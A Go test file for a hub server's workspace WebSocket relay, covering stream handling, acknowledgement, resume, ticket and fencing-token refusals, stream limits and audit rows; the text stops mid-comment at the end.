package hubserver

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/coder/websocket"

	"github.com/digitaldrywood/detent/internal/apikey"
	"github.com/digitaldrywood/detent/internal/auth"
	"github.com/digitaldrywood/detent/internal/providercapacity"
	"github.com/digitaldrywood/detent/internal/runnerauth"
	"github.com/digitaldrywood/detent/internal/tracker"
	"github.com/digitaldrywood/detent/internal/workspacesession"
)

// The relay is tested against real WebSocket connections on an httptest server
// rather than by calling the handlers: the whole point of section 18.2 is what
// happens between two sockets -- stream ownership, sequencing, acknowledgement,
// supersession and resume -- and none of that is visible from a handler call.

// relayFixture is a hub with workspace sessions enabled, one issue, one
// enrolled runner that reports the read-only surfaces, and one bound workspace.
type relayFixture struct {
	nativeFixture
	mu        sync.Mutex
	clock     time.Time
	server    *httptest.Server
	runner    runnerFixture
	workspace string
	lease     tracker.NativeLease
	item      string
	// terminal turns the terminal surface on, in the configuration, in what
	// the runner reports and in what the bind carries.
	terminal bool
	// exec turns the exec surface on the same way. It is off by default
	// because exec is a surface a runner has to offer, exactly as the
	// terminal is: a workspace whose runner never reported it must refuse the
	// channel (decisions section 18.12).
	exec bool
	// readOnly binds the workspace read-only, which is what a workspace on a
	// still-running attempt is. It is the state that refuses exec whatever the
	// runner can serve.
	readOnly bool
	// terminalDisabled reports the terminal capability from the runner while
	// leaving workspaces.terminal.enabled off. It is the one shape that
	// separates "this runner cannot serve a terminal" from "this organization
	// has not turned terminals on", which are two different refusals a person
	// has to be able to tell apart (section 18.3).
	terminalDisabled bool
	// noRecording turns workspaces.terminal.record off, which section 18.3
	// defaults to on.
	noRecording bool
	// git turns the git surface on the same way. It is off by default so the
	// fixture keeps a workspace whose runner never reported the capability,
	// which is what the channelPermitted refusal is tested against.
	git bool
}

// withTerminal is the fixture option that reports and binds the terminal
// surface as well, and turns workspaces.terminal.enabled on. The terminal is
// the only channel that opens a stream per request (one PTY per open, section
// 18.2), so it is the only one that can reach the per-connection limit.
func withTerminal(fixture *relayFixture) { fixture.terminal = true }

// withTerminalReportedButDisabled reports the terminal capability and leaves
// the setting off, which is the shape a runner that serves terminals has on an
// organization that has not turned them on.
func withTerminalReportedButDisabled(fixture *relayFixture) {
	fixture.terminal = true
	fixture.terminalDisabled = true
}

// withoutRecording turns workspaces.terminal.record off. A terminal with it off
// is still a terminal; it just leaves nothing behind.
func withoutRecording(fixture *relayFixture) { fixture.noRecording = true }

// withExec is the fixture option that reports and binds the exec surface, so
// the workspace may carry project action runs.
func withExec(fixture *relayFixture) { fixture.exec = true }

// withReadOnlyExec reports exec and then holds the workspace read-only, which
// is the shape a workspace opened on a running attempt has.
func withReadOnlyExec(fixture *relayFixture) {
	fixture.exec = true
	fixture.readOnly = true
}

// withGit reports and requires the git capability, so the workspace serves the
// header's git action group (section 18.13). It goes in `requires` as well as
// in the report, because the claim gate matches `requires` against what the
// runner reported and a workspace that only reported it would still be
// dispatchable to a runner that could not serve it.
func withGit(fixture *relayFixture) { fixture.git = true }

func newRelayFixture(t *testing.T, options ...func(*relayFixture)) *relayFixture {
	t.Helper()
	fixture := &relayFixture{clock: time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)}
	for _, option := range options {
		option(fixture)
	}
	recording := !fixture.noRecording
	service := openTestService(t, Config{
		DatabasePath: filepath.Join(t.TempDir(), "hub.db"),
		Workspace: &WorkspaceConfig{Enabled: true,
			Terminal: WorkspaceTerminalConfig{
				Enabled: fixture.terminal && !fixture.terminalDisabled,
				Record:  &recording,
			}},
		now: func() time.Time {
			fixture.mu.Lock()
			defer fixture.mu.Unlock()
			return fixture.clock
		},
	})
	fixture.nativeFixture = newNativeFixture(t, service, "", "relay")
	policy := hubTestPolicy()
	approveHubTestPolicy(t, service, fixture.base+"/policy", policy)
	fixture.server = httptest.NewServer(service.echo)
	t.Cleanup(fixture.server.Close)

	fixture.runner = prepareRunner(t, fixture.nativeFixture, runnerauth.Read, runnerauth.Collaborate,
		runnerauth.Claim, runnerauth.Heartbeat, runnerauth.Events)
	fixture.runner.enroll(t)
	fixture.reportCapabilities(t, fixture.capabilities())

	issue := fixture.create(t, "subject")
	requires := []string{workspacesession.CapabilityFiles}
	if fixture.git {
		requires = append(requires, workspacesession.CapabilityGit)
	}
	fixture.workspace = fixture.open(t, map[string]any{
		"idempotency_key": "ws-1", "work_item_id": string(issue.WorkItemID), "requires": requires,
	})
	fixture.item = fixture.dispatchItem(t)
	fixture.lease = fixture.claim(t)
	fixture.bind(t)
	if fixture.readOnly {
		// A workspace is held read-only by the attempt it was opened on still
		// running (section 18.1). The flag is what the relay reads, and
		// setting it here is the shortest honest way to reach that state
		// without a second attempt's whole lifecycle in the fixture.
		if _, err := service.database.db.ExecContext(t.Context(),
			"UPDATE workspace_sessions SET read_only = 1 WHERE id = ?", fixture.workspace); err != nil {
			t.Fatal(err)
		}
	}
	return fixture
}

// capabilities is what the runner reports and binds with.
func (f *relayFixture) capabilities() workspacesession.Capabilities {
	return workspacesession.Capabilities{
		Files: true, Diff: true, Terminal: f.terminal, Exec: f.exec, Git: f.git,
	}
}

// markReadOnly puts the workspace in the state section 18.1 gives a workspace
// opened on an attempt that is still running: the person may look at the
// worktree the model is editing and may not type into it.
//
// It writes the column rather than staging a running attempt, because
// read_only is set once at creation and never changed afterwards -- so the row
// this writes is exactly the row the hub would hold, and the alternative would
// be an attempt, a lease and a dispatch to assert one boolean.
func (f *relayFixture) markReadOnly(t *testing.T) {
	t.Helper()
	if _, err := f.service.database.db.ExecContext(t.Context(),
		"UPDATE workspace_sessions SET read_only = 1 WHERE id = ?", f.workspace); err != nil {
		t.Fatal(err)
	}
}

// record reads the workspace row the relay fences against, for the checks that
// are tested against the database rather than over a socket.
func (f *relayFixture) record(t *testing.T) workspaceRecord {
	t.Helper()
	record, err := readWorkspaceByID(t.Context(), f.service.database.db, f.workspace)
	if err != nil {
		t.Fatal(err)
	}
	return record
}

// reportCapabilities is the runner's heartbeat carrying what it can serve for a
// workspace, beside the provider report (decisions section 18.10).
func (f *relayFixture) reportCapabilities(t *testing.T, capabilities workspacesession.Capabilities) {
	t.Helper()
	report := providercapacity.Report{Provider: "openai", Backend: "codex", AccountAlias: "relay",
		Models: []string{"test-model"}, MaxConcurrent: 4, Availability: "available", ObservedAt: f.at()}
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/machines/"+string(f.runner.binding.MachineID)+"/heartbeat", f.runner.redemption.Credential,
		map[string]any{
			"display_name": "runner", "capacity": 8, "version": "test",
			"provider_reports": []providercapacity.Report{report}, "workspace_capabilities": capabilities,
			"workspace_isolation": workspacesession.IsolationContainer,
		})
	requireNativeStatus(t, response, http.StatusNoContent)
}

func (f *relayFixture) at() time.Time {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.clock
}

func (f *relayFixture) advance(d time.Duration) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.clock = f.clock.Add(d)
}

// open requests a workspace and returns its id.
func (f *relayFixture) open(t *testing.T, body map[string]any) string {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/workspaces", f.token, body)
	requireNativeStatus(t, response, http.StatusCreated)
	var session workspacesession.Session
	decodeHubResponse(t, response, &session)
	return session.ID
}

// dispatchItem is the native issue the hub created to dispatch the workspace.
func (f *relayFixture) dispatchItem(t *testing.T) string {
	t.Helper()
	var item string
	if err := f.service.database.db.QueryRowContext(t.Context(),
		"SELECT work_item_id FROM workspace_items WHERE workspace_id = ?", f.workspace).Scan(&item); err != nil {
		t.Fatal(err)
	}
	return item
}

// claim takes the workspace item's lease for the fixture's runner.
func (f *relayFixture) claim(t *testing.T) tracker.NativeLease {
	t.Helper()
	// Exactly what hubclient.WorkspaceClaimer sends: the workspace capability,
	// which is what the candidate query offers workspace items against
	// (decisions section 18.1), and no local model selection, because a
	// workspace session runs no model.
	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/claims", f.runner.redemption.Credential,
		tracker.NativeClaim{PolicyID: hubTestPolicy().ID, WorkItemID: tracker.NativeWorkItemID(f.item),
			MachineID: f.runner.binding.MachineID, SessionID: "relay-session", TTLSeconds: 90, ProtocolMajor: 2,
			Capabilities: []string{"native_issues", "scoped_collaboration", tracker.NativeWorkspaceCapability}})
	requireNativeStatus(t, response, http.StatusOK)
	var lease tracker.NativeLease
	decodeHubResponse(t, response, &lease)
	return lease
}

// bind takes the workspace to ready, which is the only state the relay serves.
func (f *relayFixture) bind(t *testing.T) {
	t.Helper()
	identity := map[string]any{"lease_id": f.lease.ID, "fencing_token": strconv.FormatInt(int64(f.lease.FencingToken), 10)}
	body := map[string]any{
		"lease_id": identity["lease_id"], "fencing_token": identity["fencing_token"],
		"capabilities": f.capabilities(),
		"isolation":    workspacesession.IsolationContainer,
	}
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/workspaces/"+f.workspace+"/worker/bind", f.runner.redemption.Credential, body)
	requireNativeStatus(t, response, http.StatusOK)
	body["state"] = workspacesession.StateReady
	body["head_sha"] = "abc123"
	response = performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/workspaces/"+f.workspace+"/worker/heartbeat", f.runner.redemption.Credential, body)
	requireNativeStatus(t, response, http.StatusOK)
}

// ticket mints a relay ticket for the operator token.
func (f *relayFixture) ticket(t *testing.T) string {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/workspaces/"+f.workspace+"/relay-tickets", f.token, map[string]any{})
	requireNativeStatus(t, response, http.StatusCreated)
	var minted workspaceRelayTicketResponse
	decodeHubResponse(t, response, &minted)
	return minted.Ticket
}

// socketURL turns a hub path into the websocket URL of the test server.
func (f *relayFixture) socketURL(path string) string {
	return "ws" + strings.TrimPrefix(f.server.URL, "http") + path
}

// dialPerson opens a person connection with a fresh ticket.
func (f *relayFixture) dialPerson(t *testing.T) *relayClient {
	t.Helper()
	ticket := f.ticket(t)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/relay?ticket=" + ticket)
	return f.dial(t, url, http.Header{"Authorization": {"Bearer " + f.token}})
}

// dialRunner opens the workspace's runner connection.
func (f *relayFixture) dialRunner(t *testing.T) *relayClient {
	t.Helper()
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/worker/relay")
	return f.dial(t, url, http.Header{
		"Authorization":          {"Bearer " + f.runner.redemption.Credential},
		"X-Detent-Lease":         {string(f.lease.ID)},
		"X-Detent-Fencing-Token": {strconv.FormatInt(int64(f.lease.FencingToken), 10)},
	})
}

func (f *relayFixture) dial(t *testing.T, url string, header http.Header) *relayClient {
	t.Helper()
	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	defer cancel()
	socket, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: header})
	closeRelayDial(response)
	if err != nil {
		t.Fatalf("dial %s: %v", url, err)
	}
	socket.SetReadLimit(relayReadLimit)
	client := &relayClient{t: t, socket: socket}
	t.Cleanup(func() { _ = socket.Close(websocket.StatusNormalClosure, "test over") })
	return client
}

// relayClient is one side of a relay conversation in a test.
type relayClient struct {
	t      *testing.T
	socket *websocket.Conn
}

func (c *relayClient) send(frame workspacesession.Frame) {
	c.t.Helper()
	encoded, err := json.Marshal(frame)
	if err != nil {
		c.t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(c.t.Context(), 5*time.Second)
	defer cancel()
	if err := c.socket.Write(ctx, websocket.MessageText, encoded); err != nil {
		c.t.Fatalf("write frame: %v", err)
	}
}

// receive reads the next frame, failing the test rather than hanging when none
// arrives: a relay bug shows up as silence, and a test that hangs on silence
// tells nobody which frame went missing.
func (c *relayClient) receive() workspacesession.Frame {
	c.t.Helper()
	ctx, cancel := context.WithTimeout(c.t.Context(), 10*time.Second)
	defer cancel()
	kind, data, err := c.socket.Read(ctx)
	if err != nil {
		c.t.Fatalf("read frame: %v", err)
	}
	if kind != websocket.MessageText {
		c.t.Fatalf("frame message type = %v, want text", kind)
	}
	var frame workspacesession.Frame
	if err := json.Unmarshal(data, &frame); err != nil {
		c.t.Fatalf("decode frame %q: %v", data, err)
	}
	return frame
}

// expectClosed asserts the socket ends rather than delivering another frame.
func (c *relayClient) expectClosed() {
	c.t.Helper()
	ctx, cancel := context.WithTimeout(c.t.Context(), 10*time.Second)
	defer cancel()
	for {
		kind, data, err := c.socket.Read(ctx)
		if err != nil {
			return
		}
		// A close is announced with an error frame before the socket ends, so
		// one more frame is expected; anything after it is not.
		if kind == websocket.MessageText && json.Valid(data) {
			continue
		}
		c.t.Fatalf("expected the socket to close, read %q", data)
	}
}

func filesListFrame(path string) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.FilesRequest{Path: path})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelFiles, Type: workspacesession.TypeFilesList, Payload: payload}
}

func TestWorkspaceRelayForwardsAFilesRequestAndItsAnswer(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(filesListFrame("internal"))
	forwarded := runner.receive()
	if forwarded.Channel != workspacesession.ChannelFiles || forwarded.Type != workspacesession.TypeFilesList {
		t.Fatalf("runner received %+v", forwarded)
	}
	// The hub allocates the stream, so the person never chooses an id and a
	// second tab cannot name the first one's stream.
	connection, index, err := workspacesession.ParseStreamID(forwarded.Stream)
	if err != nil || index != 1 || connection == "" {
		t.Fatalf("stream id %q: %v", forwarded.Stream, err)
	}
	if forwarded.Seq != 1 {
		t.Fatalf("runner-bound seq = %d, want 1", forwarded.Seq)
	}
	// The actor is stamped by the hub and never supplied by the client, which
	// is what lets a runner audit what it was asked to do and by whom.
	if forwarded.Actor == nil || forwarded.Actor.PrincipalID == "" || forwarded.Actor.ConnectionID != connection {
		t.Fatalf("actor = %+v, want the hub's stamp for connection %q", forwarded.Actor, connection)
	}

	listed, err := workspacesession.Encode(workspacesession.FilesListed{Path: "internal", Entries: []workspacesession.FilesEntry{{Name: "hubserver", Kind: workspacesession.KindDir}}})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeFilesListed, Payload: listed})
	answer := person.receive()
	if answer.Type != workspacesession.TypeFilesListed || answer.Stream != forwarded.Stream || answer.Seq != 1 {
		t.Fatalf("person received %+v", answer)
	}
	// The runner never sees the hub's actor stamp echoed back at the person:
	// it is the hub's own annotation on the runner-bound copy.
	if answer.Actor != nil {
		t.Fatalf("person-bound frame carried an actor: %+v", answer.Actor)
	}
}

func TestWorkspaceRelayAcknowledgementReleasesTheReplayBuffer(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	forwarded := runner.receive()

	payload, err := workspacesession.Encode(workspacesession.FilesListed{Path: ""})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeFilesListed, Payload: payload})
	answer := person.receive()

	before := f.service.workspaces.relay.memoryUsed()
	if before == 0 {
		t.Fatal("an unacknowledged frame must be buffered for replay")
	}
	ack, err := workspacesession.Encode(workspacesession.AckPayload{Through: answer.Seq})
	if err != nil {
		t.Fatal(err)
	}
	person.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeAck, Payload: ack})
	// The ack is processed on the hub's read loop, so the release is observed
	// rather than assumed: a poll here is the only honest way to wait for
	// another goroutine's effect.
	waitFor(t, func() bool { return f.service.workspaces.relay.memoryUsed() < before })
}

// waitFor polls a condition until it holds or the test times out. The relay's
// effects happen on its own goroutines, so a test that asserted immediately
// would be asserting on a race rather than on behaviour.
func waitFor(t *testing.T, condition func() bool) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if condition() {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatal("the condition did not hold before the deadline")
}

func TestWorkspaceRelayRefusesASecondUseOfATicket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	ticket := f.ticket(t)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/relay?ticket=" + ticket)
	header := http.Header{"Authorization": {"Bearer " + f.token}}
	first := f.dial(t, url, header)
	_ = first
	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	defer cancel()
	refused, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: header})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("a ticket is single use; the second connection must be refused")
	}
}

func TestWorkspaceRelayRefusesAnExpiredTicket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	ticket := f.ticket(t)
	f.advance(workspacesession.TicketLifetime + time.Second)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/relay?ticket=" + ticket)
	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	defer cancel()
	refused, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{
		HTTPHeader: http.Header{"Authorization": {"Bearer " + f.token}},
	})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("a ticket is worth 30 seconds; an expired one must be refused")
	}
}

func TestWorkspaceRelayRefusesAnUpgradeWithoutATicket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	defer cancel()
	refused, response, err := websocket.Dial(ctx, f.socketURL(f.base+"/workspaces/"+f.workspace+"/relay"), &websocket.DialOptions{
		HTTPHeader: http.Header{"Authorization": {"Bearer " + f.token}},
	})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("the upgrade carries no CSRF header, so a ticket is the only credential that may open it")
	}
}

func TestWorkspaceRelaySupersedesASecondRunnerConnection(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	first := f.dialRunner(t)
	second := f.dialRunner(t)

	// Two runners answering one workspace would each be serving a different
	// worktree, so the older connection is told exactly why it lost it.
	notice := first.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(notice.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeSuperseded {
		t.Fatalf("first runner received %+v, want superseded", payload)
	}
	first.expectClosed()

	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	if forwarded := second.receive(); forwarded.Type != workspacesession.TypeFilesList {
		t.Fatalf("the surviving runner received %+v", forwarded)
	}
}

func TestWorkspaceRelayAnswersAnUnknownChannelWithoutClosingTheSocket(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(workspacesession.Frame{Channel: "agents", Type: "open"})
	answer := person.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeInvalidFrame {
		t.Fatalf("unknown channel answered %+v", payload)
	}
	// A client bug on one frame must not cost a person their session, so the
	// next legal frame still reaches the runner.
	person.send(filesListFrame(""))
	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeFilesList {
		t.Fatalf("the connection did not survive one bad frame: %+v", forwarded)
	}
}

func TestWorkspaceRelayRefusesAChannelTheWorkspaceDoesNotServe(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.dialRunner(t)
	person := f.dialPerson(t)

	// The runner reported files and diff; a terminal is neither offered by
	// the runner nor enabled for the organization, so the channel is refused
	// rather than forwarded to a runner that cannot serve it.
	person.send(workspacesession.Frame{Channel: workspacesession.ChannelTerminal, Type: workspacesession.TypeOpen})
	answer := person.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeForbidden {
		t.Fatalf("terminal channel answered %+v, want forbidden", payload)
	}
}

// terminalOpenFrame is a person's `open` on the terminal channel. Section 18.2
// gives every open its own PTY, so each one is a stream of its own.
func terminalOpenFrame() workspacesession.Frame {
	payload, err := workspacesession.Encode(map[string]any{"cols": 80, "rows": 24})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelTerminal, Type: workspacesession.TypeOpen, Payload: payload}
}

// errorPayload decodes an error frame, failing the test when the frame is
// something else: a test that reads "want stream_limit" out of a `listed` is
// reporting the wrong thing.
func errorPayload(t *testing.T, frame workspacesession.Frame) workspacesession.ErrorPayload {
	t.Helper()
	if frame.Type != workspacesession.TypeError {
		t.Fatalf("frame %+v is not an error", frame)
	}
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(frame.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	return payload
}

func TestWorkspaceRelayEnforcesThePerConnectionStreamLimit(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withTerminal)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	// A terminal opens explicitly and every open is its own PTY, so this is
	// the channel the per-connection limit is actually about.
	for index := range workspacesession.MaxStreamsPerConnection {
		person.send(terminalOpenFrame())
		if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeOpen {
			t.Fatalf("stream %d was not forwarded: %+v", index, forwarded)
		}
	}
	person.send(terminalOpenFrame())
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeStreamLimit {
		t.Fatalf("the ninth stream answered %+v, want stream_limit", payload)
	}
}

// The sixth dogfood run's stream-accounting defect, in both halves.
//
// A Files client that never names a stream is not asking for a new one: the
// channel is request/response and the connection has one conversation on it.
// The hub used to allocate per request, so the ninth listing on a connection
// was refused with stream_limit and the connection could never list again.
func TestWorkspaceRelayReusesAStreamlessRequestChannelStream(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	// One more round than the per-connection limit, every one of them sent the
	// way the dogfood client sent them: no stream field at all.
	rounds := workspacesession.MaxStreamsPerConnection + 1
	first := ""
	for round := range rounds {
		person.send(filesListFrame("."))
		forwarded := runner.receive()
		if forwarded.Type != workspacesession.TypeFilesList {
			t.Fatalf("round %d answered %+v, want the list forwarded", round+1, forwarded)
		}
		if first == "" {
			first = forwarded.Stream
		}
		if forwarded.Stream != first {
			t.Fatalf("round %d ran on stream %q, want %q", round+1, forwarded.Stream, first)
		}
		// seq is per stream per direction from 1, so a reused stream counts up
		// rather than restarting.
		if forwarded.Seq != int64(round+1) {
			t.Fatalf("round %d had seq %d, want %d", round+1, forwarded.Seq, round+1)
		}
	}
	if _, index, err := workspacesession.ParseStreamID(first); err != nil || index != 1 {
		t.Fatalf("stream id %q: %v", first, err)
	}
}

// A close gives the slot back. Without that the count that refuses the next
// stream is describing streams nobody holds.
func TestWorkspaceRelayReclaimsAClosedStreamTowardTheLimit(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withTerminal)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	opened := make([]string, 0, workspacesession.MaxStreamsPerConnection)
	for range workspacesession.MaxStreamsPerConnection {
		person.send(terminalOpenFrame())
		opened = append(opened, runner.receive().Stream)
	}
	person.send(terminalOpenFrame())
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeStreamLimit {
		t.Fatalf("the ninth open answered %+v, want stream_limit", payload)
	}

	person.send(workspacesession.Frame{Channel: workspacesession.ChannelTerminal, Stream: opened[0], Type: workspacesession.TypeClose})
	if answer := person.receive(); answer.Type != workspacesession.TypeClosed || answer.Stream != opened[0] {
		t.Fatalf("close answered %+v, want closed on %q", answer, opened[0])
	}
	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeClose {
		t.Fatalf("the runner was not told to close: %+v", forwarded)
	}

	// The freed slot is usable, and it is a new stream rather than the closed
	// id handed out a second time.
	person.send(terminalOpenFrame())
	forwarded := runner.receive()
	if forwarded.Type != workspacesession.TypeOpen {
		t.Fatalf("the open after a close answered %+v", forwarded)
	}
	if slices.Contains(opened, forwarded.Stream) {
		t.Fatalf("stream %q reuses an id already handed out: %v", forwarded.Stream, opened)
	}
}

func TestWorkspaceRelayResumesAStreamWithinTheWindow(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	forwarded := runner.receive()

	// The runner answers while the person is away, so the frame is buffered
	// for the 60 seconds section 18.2 gives them to come back.
	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
	waitFor(t, func() bool { return f.service.workspaces.relay.detachedCount(f.workspace) == 1 })
	payload, err := workspacesession.Encode(workspacesession.FilesListed{Path: "internal"})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Stream: forwarded.Stream, Type: workspacesession.TypeFilesListed, Payload: payload})

	resumed := f.dialPerson(t)
	request, err := workspacesession.Encode(workspacesession.ResumePayload{Stream: forwarded.Stream, LastSeq: 0})
	if err != nil {
		t.Fatal(err)
	}
	resumed.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Type: workspacesession.TypeResume, Payload: request})
	if answer := resumed.receive(); answer.Type != workspacesession.TypeResumed {
		t.Fatalf("resume answered %+v", answer)
	}
	replay := resumed.receive()
	if replay.Type != workspacesession.TypeFilesListed || replay.Stream != forwarded.Stream {
		t.Fatalf("replay = %+v, want the buffered answer", replay)
	}
}

func TestWorkspaceRelayRefusesAResumePastTheWindow(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	forwarded := runner.receive()
	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
	waitFor(t, func() bool { return f.service.workspaces.relay.detachedCount(f.workspace) == 1 })

	f.advance(workspacesession.ResumeWindow + time.Second)
	resumed := f.dialPerson(t)
	request, err := workspacesession.Encode(workspacesession.ResumePayload{Stream: forwarded.Stream, LastSeq: 0})
	if err != nil {
		t.Fatal(err)
	}
	resumed.send(workspacesession.Frame{Channel: workspacesession.ChannelFiles, Type: workspacesession.TypeResume, Payload: request})
	answer := resumed.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Code != workspacesession.CodeResumeFailed {
		t.Fatalf("a resume past the window answered %+v, want resume_failed", payload)
	}
}

func TestWorkspaceRelayClosesEveryConnectionWhenTheWorkspaceEnds(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	response := performHubAPIRequest(t, f.service, http.MethodDelete, f.base+"/workspaces/"+f.workspace, f.token, nil)
	requireNativeStatus(t, response, http.StatusNoContent)
	for _, client := range []*relayClient{person, runner} {
		notice := client.receive()
		var payload workspacesession.ErrorPayload
		if err := json.Unmarshal(notice.Payload, &payload); err != nil {
			t.Fatal(err)
		}
		if payload.Code != workspacesession.CodeWorkspaceClosed {
			t.Fatalf("close notice = %+v, want workspace_closed", payload)
		}
		client.expectClosed()
	}
}

func TestWorkspaceRelayTellsAPersonWhenNoRunnerIsServing(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	answer := person.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	// An unanswered request is indistinguishable from a slow one, and only
	// the hub knows which this is.
	if payload.Code != workspacesession.CodeStaleExecution {
		t.Fatalf("with no runner attached the person received %+v", payload)
	}
}

func TestWorkspaceRelayWritesAnAuditRowForEveryPersonConnection(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))

	waitFor(t, func() bool {
		var rows int
		if err := f.service.database.db.QueryRowContext(t.Context(),
			"SELECT count(*) FROM workspace_relay_sessions WHERE workspace_id = ?", f.workspace).Scan(&rows); err != nil {
			return false
		}
		return rows == 1
	})
	_ = person.socket.Close(websocket.StatusNormalClosure, "done")
	waitFor(t, func() bool {
		var closed, bytesIn int64
		var reason string
		err := f.service.database.db.QueryRowContext(t.Context(),
			"SELECT count(closed_at), coalesce(max(bytes_in),0), coalesce(max(close_reason),'') FROM workspace_relay_sessions WHERE workspace_id = ?",
			f.workspace).Scan(&closed, &bytesIn, &reason)
		return err == nil && closed == 1 && bytesIn > 0 && reason != ""
	})
}

func TestWorkspaceRelayRefusesARunnerSocketThatIsNotTheWorkspacesOwner(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/worker/relay")
	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	defer cancel()
	refused, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: http.Header{
		"Authorization":          {"Bearer " + f.runner.redemption.Credential},
		"X-Detent-Lease":         {string(f.lease.ID)},
		"X-Detent-Fencing-Token": {strconv.FormatInt(int64(f.lease.FencingToken)+1, 10)},
	}})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("a stale fencing token must not open the runner relay")
	}
}

// closeRelayDial releases the upgrade response a dial hands back, refused or
